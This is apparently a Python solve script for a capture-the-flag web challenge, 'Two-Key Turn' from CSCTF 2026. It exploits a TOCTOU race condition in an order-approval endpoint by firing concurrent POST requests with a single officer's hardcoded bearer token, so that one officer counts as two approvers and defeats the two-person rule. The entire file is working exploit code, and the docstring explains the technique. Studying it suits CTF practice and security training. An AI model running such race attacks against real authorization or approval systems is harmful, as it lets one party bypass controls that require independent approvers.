#!/usr/bin/env python3
"""
Two-Key Turn (web/easy) - CSCTF 2026 "Total Warfare"

The console enforces a two-person rule: a fire order arms only once two
DISTINCT officers have each cast one APPROVE. We only hold a single
officer's credential (VEGA-7). "approve" is documented as "idempotent per
officer while an approval window is pending" - but idempotency checks like
this are commonly implemented as a non-atomic read-check-then-write, which
is vulnerable to a classic TOCTOU race condition.

By firing a burst of POST /orders/{id}/approve requests concurrently (on
separate connections, as the schema itself hints is "supported"), several
requests can read "0 prior approvals from VEGA-7" before any of them has
written its own approval record. Each one then writes its own record,
letting a single officer register two approvals and reach
required_approvals = 2, arming the order and releasing the flag.

Usage:
    python3 solve.py [base_url] [order_id]
"""
import sys
import concurrent.futures
import urllib.request
import json

BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://w05.ctf.chronos-security.ro:34125"
OPERATOR_KEY = "opk_vega7_2f4b9c17e0a3"
HEADERS = {"Authorization": f"Bearer {OPERATOR_KEY}"}
BURST_SIZE = 8  # within the advertised "6-8 separate-connection" burst window


def get(path):
    req = urllib.request.Request(BASE_URL + path, headers=HEADERS)
    with urllib.request.urlopen(req) as resp:
        return json.loads(resp.read())


def approve(order_id):
    req = urllib.request.Request(
        f"{BASE_URL}/orders/{order_id}/approve", headers=HEADERS, method="POST"
    )
    try:
        with urllib.request.urlopen(req) as resp:
            return json.loads(resp.read())
    except urllib.error.HTTPError as e:
        return json.loads(e.read())


def find_pending_order():
    orders = get("/orders")["orders"]
    for o in orders:
        if o["status"] == "PENDING_AUTH":
            return o["id"]
    raise RuntimeError("no PENDING_AUTH order found")


def main():
    order_id = sys.argv[2] if len(sys.argv) > 2 else find_pending_order()
    print(f"[+] Target order: {order_id}")

    print(f"[+] Firing {BURST_SIZE} concurrent approve() requests (race condition)...")
    with concurrent.futures.ThreadPoolExecutor(max_workers=BURST_SIZE) as pool:
        results = list(pool.map(lambda _: approve(order_id), range(BURST_SIZE)))

    armed = [r for r in results if r.get("status") == "ARMED"]
    if not armed:
        print("[-] Order did not arm. Last response:")
        print(json.dumps(results[-1], indent=2))
        sys.exit(1)

    final = armed[-1]
    print(f"[+] Order status : {final['status']}")
    print(f"[+] Approvals    : {final['approvals']}/{final['required_approvals']}")
    for rec in final["approval_records"]:
        print(f"      - {rec['record_id']} by {rec['officer']} (epoch {rec['epoch']})")
    print(f"[+] Flag: {final['arming_authorization']}")


if __name__ == "__main__":
    main()
